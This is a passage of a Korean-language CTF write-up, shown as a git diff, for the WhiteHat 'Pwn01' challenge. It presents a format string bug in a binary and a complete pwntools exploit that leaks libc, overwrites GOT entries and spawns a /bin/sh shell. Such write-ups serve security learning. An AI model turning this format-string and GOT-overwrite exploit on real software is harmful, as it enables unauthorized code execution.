@@ -308,3 +308,134 @@ $python3 sol.py
 found!
 Flag = WhiteHat{8333769562446613979}
 ```
+
+## Pwnable
+
+### Pwn01 - 100pts
+
+`loop`이랑 `libc.so.6`이 주어진다.
+
+`func03` 함수에 format string bug 취약점이 존재한다.
+
+```c++
+__int64 __fastcall vuln(const char * buf) {
+  printf("Hello ");
+  printf(buf, 0 LL); // fsb!
+  puts("\nWe will suggest you some interesting places in Vietnam");
+  puts("[+] Ha Long bay.");
+  puts("[+] Phu Quoc island.");
+  puts("[+] Kong island.");
+  puts("[+] Hoan Kiem lake.");
+  puts("[+] Sapa.");
+  puts("[+] ...");
+  puts("Wish you have great moments in Vietnam!");
+  return 0 LL;
+}
+```
+
+```console
+$checksec loop
+[*] '/pwd/loop'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+PIE가 안 걸려있다.
+
+```console
+$ ./loop
+Welcome to VietNam!!!
+What's your name? AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+Hello AAAAAAAA 0x7fffde161b20 (nil) (nil) 0x6 0x6 0x4000000002 0x7fffde1641f0 0x7fffde164240 0x4008a4 0x7fffde164338 0x100000000 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025
+...
+```
+
+%12$p 부터 payload가 시작된다
+
+```console
+pwndbg> x/20gx 0x7fffffffe540
+0x7fffffffe540: 0x4141414141414141      0x4141414141414141
+0x7fffffffe550: 0x00000000000a4141      0x000000000040090d
+0x7fffffffe560: 0x00007ffff7fbe2e8      0x00000000004008c0
+0x7fffffffe570: 0x0000000000000000      0x0000000000400630
+0x7fffffffe580: 0x00007fffffffe680      0x38aa051f150a9400
+0x7fffffffe590: 0x0000000000000000      0x00007ffff7df10b3
+0x7fffffffe5a0: 0x0000000000000000      0x00007fffffffe688
+0x7fffffffe5b0: 0x0000000100000000      0x0000000000400805
+0x7fffffffe5c0: 0x00000000004008c0      0xb38d361b52a7a337
+0x7fffffffe5d0: 0x0000000000400630      0x00007fffffffe680
+pwndbg> x/i 0x00007ffff7df10b3
+   0x7ffff7df10b3 <__libc_start_main+243>:      mov    edi,eax
+```
+`__libc_start_main+243`은 %23$p 다
+
+
+fsb 취약점이 이용되기 전에 `puts`는 한 번도 호출되지 않으므로 `puts_got`에는 code 영역의 주소가 적혀있다.
+따라서 `puts_got`의 하위 2바이트만 덮어씌워 `main` 함수가 다시 호출되도록 할 수 있다.
+
+#### exploit.py
+
+로컬 환경에서만 돌렸다.
+
+문제 libc로는 `one_gadget`을 쓸 수 있는 것 같다.
+
+{% raw %}
+```python
+from pwn import *
+
+p = process("./loop")
+e = ELF("./loop")
+lib = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
+
+def fsb(payload):
+    p.sendlineafter("What's your name?", payload)
+
+def overwrite_got(got, val):
+    low = val & 0xffff
+    middle = (val >> 16) & 0xffff
+
+    target1 = (low, got)
+    target2 = (middle, got + 2)
+
+    if low > middle:
+        target1, target2 = target2, target1
+
+    payload = f'%{target1[0]}c%16$hn'
+    payload += f'%{target2[0] - target1[0]}c%17$hn'
+    payload = payload.ljust(32, 'A').encode()
+    payload += p64(target1[1]) + p64(target2[1])
+    fsb(payload)
+
+# puts_got -> main
+payload = f'%{e.sym["main"] & 0xffff}c%15$hn%23$p@@'.ljust(24, 'A').encode()
+payload += p64(e.got['puts'])
+fsb(payload)
+
+# libc leak
+p.recvuntil("0x")
+libc_base = int(p.recvuntil('@@')[:-2], 16) - lib.sym['__libc_start_main'] - 243
+print(hex(libc_base))
+
+system = libc_base + lib.sym['system']
+binsh = libc_base + next(lib.search(b"/bin/sh\x00"))
+puts = libc_base + lib.sym['puts']
+
+# setvbuf -> puts
+overwrite_got(e.got['setvbuf'], puts)
+
+# stderr -> binsh
+overwrite_got(e.got['stderr'], binsh)
+
+# setvbuf -> system
+overwrite_got(e.got['setvbuf'], system)
+
+p.interactive()
+```
+{% endraw %}
+
+---
+
+나머지 문제들은 바이너리를 못 찾았다..
